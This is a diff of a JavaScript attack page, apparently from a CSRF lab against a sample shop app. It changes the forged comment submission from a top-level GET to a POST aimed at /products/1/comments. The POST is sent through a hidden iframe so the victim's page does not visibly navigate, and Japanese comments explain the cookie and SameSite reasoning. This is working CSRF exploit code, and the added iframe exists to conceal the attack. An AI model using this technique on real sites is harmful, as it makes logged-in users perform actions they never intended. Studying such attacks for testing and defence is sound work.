@@ -50,17 +50,27 @@
 
       function buildPayload() {
         const body = document.getElementById("commentBody").value;
-        return { product_id: 1, body };
+        return { body };
       }
 
       function submitPost() {
         const payload = buildPayload();
 
+        // ページ遷移（リダイレクト）を防ぐために、隠し iframe を作成してそこへ送信する
+        const iframeName = "csrf-frame";
+        let iframe = document.getElementsByName(iframeName)[0];
+        if (!iframe) {
+          iframe = document.createElement("iframe");
+          iframe.name = iframeName;
+          iframe.style.display = "none";
+          document.body.appendChild(iframe);
+        }
+
         const form = document.createElement("form");
-        form.method = "GET";
-        // SameSite=LaxではトップレベルGET遷移のみCookieが送信される
-        form.action = new URL("/csrf-comment", TARGET_BASE).toString();
-        form.target = "_self";
+        form.method = "POST";
+        // 商品ID 1 (Coffee Beans) にコメントを投稿する
+        form.action = new URL("/products/1/comments", TARGET_BASE).toString();
+        form.target = iframeName; // 送信先を iframe に指定
 
         Object.entries(payload).forEach(([k, v]) => {
           const input = document.createElement("input");
